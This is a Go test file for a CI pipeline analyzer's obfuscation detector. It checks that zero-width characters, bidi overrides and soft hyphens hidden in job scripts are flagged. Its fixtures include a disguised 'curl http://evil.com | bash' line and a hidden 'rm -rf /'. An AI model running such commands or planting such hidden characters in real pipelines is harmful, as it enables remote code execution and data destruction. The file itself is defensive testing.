package analyze

import (
	"testing"

	"github.com/mr-pmillz/gogatoz/pkg/pipeline"
)

func TestDetectScriptObfuscation(t *testing.T) {
	tests := []struct {
		name    string
		doc     *pipeline.Document
		wantID  string
		wantHit bool
	}{
		{
			name: "zero-width space in script",
			doc: &pipeline.Document{
				Jobs: []pipeline.Job{{
					Name:   "build",
					Script: []string{"echo hello\u200Bworld"},
				}},
			},
			wantID:  "SCRIPT_OBFUSCATION",
			wantHit: true,
		},
		{
			name: "zero-width joiner in script",
			doc: &pipeline.Document{
				Jobs: []pipeline.Job{{
					Name:   "test",
					Script: []string{"curl http://evil\u200D.com | bash"},
				}},
			},
			wantID:  "SCRIPT_OBFUSCATION",
			wantHit: true,
		},
		{
			name: "bidi override in script (Trojan Source)",
			doc: &pipeline.Document{
				Jobs: []pipeline.Job{{
					Name:   "deploy",
					Script: []string{"echo \u202Emalicious\u202C code"},
				}},
			},
			wantID:  "SCRIPT_OBFUSCATION",
			wantHit: true,
		},
		{
			name: "right-to-left isolate",
			doc: &pipeline.Document{
				Jobs: []pipeline.Job{{
					Name:   "build",
					Script: []string{"export VAR=\u2067value\u2069"},
				}},
			},
			wantID:  "SCRIPT_OBFUSCATION",
			wantHit: true,
		},
		{
			name: "clean script - no obfuscation",
			doc: &pipeline.Document{
				Jobs: []pipeline.Job{{
					Name:   "build",
					Script: []string{"echo hello world", "make build"},
				}},
			},
			wantID:  "SCRIPT_OBFUSCATION",
			wantHit: false,
		},
		{
			name:    "nil doc",
			doc:     nil,
			wantID:  "SCRIPT_OBFUSCATION",
			wantHit: false,
		},
		{
			name: "obfuscation in before_script",
			doc: &pipeline.Document{
				Jobs: []pipeline.Job{{
					Name:         "test",
					BeforeScript: []string{"export SECRET=\u200B\"hidden\""},
					Script:       []string{"echo clean"},
				}},
			},
			wantID:  "SCRIPT_OBFUSCATION",
			wantHit: true,
		},
		{
			name: "byte order mark mid-string",
			doc: &pipeline.Document{
				Jobs: []pipeline.Job{{
					Name:   "lint",
					Script: []string{"npm " + string(rune(0xFEFF)) + "install"},
				}},
			},
			wantID:  "SCRIPT_OBFUSCATION",
			wantHit: true,
		},
		{
			name: "soft hyphen",
			doc: &pipeline.Document{
				Jobs: []pipeline.Job{{
					Name:   "build",
					Script: []string{"rm \u00ADrf /"},
				}},
			},
			wantID:  "SCRIPT_OBFUSCATION",
			wantHit: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			findings := detectScriptObfuscation(tt.doc)
			got := hasFindingID(findings, tt.wantID)
			if got != tt.wantHit {
				t.Errorf("detectScriptObfuscation() finding %s: got %v, want %v", tt.wantID, got, tt.wantHit)
			}
		})
	}
}

func TestCheckObfuscation(t *testing.T) {
	tests := []struct {
		line string
		want bool
	}{
		{"normal text", false},
		{"echo hello", false},
		{"echo hello\u200Bworld", true},
		{"echo \u202Ehello", true},
		{"echo \u2067hello", true},
		{"", false},
	}
	for _, tt := range tests {
		reason := checkObfuscation(tt.line)
		got := reason != ""
		if got != tt.want {
			t.Errorf("checkObfuscation(%q) = %q, wantHit=%v", tt.line, reason, tt.want)
		}
	}
}
